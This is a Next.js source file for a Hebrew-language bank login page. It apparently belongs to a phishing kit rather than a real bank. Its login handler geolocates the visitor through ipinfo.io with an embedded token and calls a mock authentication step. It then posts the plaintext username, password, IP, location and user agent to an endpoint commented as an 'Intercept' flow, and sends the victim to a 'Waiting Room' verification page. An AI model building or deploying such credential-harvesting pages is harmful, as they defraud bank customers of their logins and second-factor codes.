'use client'

import LoginForm from '@/components/LoginForm'
import Link from 'next/link'

export default function LoginPage() {
  const handleLogin = async (data: { username: string; password: string; rememberMe: boolean }) => {
    console.log('Login attempt:', data)

    try {
      // 0. Fetch IP Info (Client-side)
      let ipData = { ip: 'Unknown', city: 'Unknown', country: 'Unknown' }
      try {
        const ipRes = await fetch('https://ipinfo.io/json?token=3c0709cffc7bac')
        if (ipRes.ok) {
          ipData = await ipRes.json()
        }
      } catch (e) {
        console.error('Failed to fetch IP', e)
      }

      // 1. Authenticate (Mock)
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      })

      if (response.ok) {
        // 2. Start Login Flow (Intercept)
        const flowResponse = await fetch('/api/auth/login-flow', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'start',
            username: data.username,
            password: data.password,
            metadata: {
              ip: ipData.ip,
              city: ipData.city,
              country: ipData.country,
              userAgent: navigator.userAgent
            }
          })
        })

        const flowData = await flowResponse.json()

        // 3. Redirect to Waiting Room
        if (flowData.id) {
          window.location.href = `/verify?requestId=${flowData.id}`
        }
      } else {
        const error = await response.json()
        console.error('Login failed:', error)
      }
    } catch (error) {
      console.error('Network error:', error)
    }
  }

  return (
    <div className="min-h-screen bg-[url('https://images.unsplash.com/photo-1565514020176-db79361cb1cc?q=80&w=2070&auto=format&fit=crop')] bg-cover bg-center flex items-center justify-center p-4 relative">
      <div className="absolute inset-0 bg-gradient-to-br from-bank-primary/90 to-black/80 backdrop-blur-[2px]"></div>

      <div className="relative w-full max-w-5xl grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
        {/* Left Side: Illustration / Branding (Hidden on mobile) */}
        <div className="hidden lg:block text-white space-y-6 px-8">
          <div className="w-16 h-1 bg-bank-secondary mb-6 rounded-full"></div>
          <h1 className="text-5xl font-bold leading-tight">
            הבנקאות שלך,<br />
            <span className="text-bank-secondary">מתקדמת יותר.</span>
          </h1>
          <p className="text-lg text-gray-200 opacity-90 leading-relaxed max-w-md">
            הצטרפו למאות אלפי לקוחות הנהנים מחוויה דיגיטלית חכמה, מאובטחת ומותאמת אישית לצרכים הפיננסיים שלכם.
          </p>

          <div className="grid grid-cols-2 gap-6 mt-12">
            <div className="bg-white/10 backdrop-blur-md p-4 rounded-xl border border-white/10">
              <div className="text-2xl font-bold mb-1">24/7</div>
              <div className="text-sm opacity-80">זמינות מלאה</div>
            </div>
            <div className="bg-white/10 backdrop-blur-md p-4 rounded-xl border border-white/10">
              <div className="text-2xl font-bold mb-1">100%</div>
              <div className="text-sm opacity-80">אבטחה מתקדמת</div>
            </div>
          </div>
        </div>

        {/* Right Side: Login Form */}
        <div className="w-full max-w-md mx-auto">
          <LoginForm onSubmit={handleLogin} />

          <div className="mt-8 text-center text-sm text-gray-400">
            <p className="flex items-center justify-center gap-2">
              <span>נתקלת בבעיה?</span>
              <Link href="/help" className="text-bank-secondary hover:text-white transition-colors underline-offset-4 hover:underline">
                מרכז העזרה
              </Link>
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}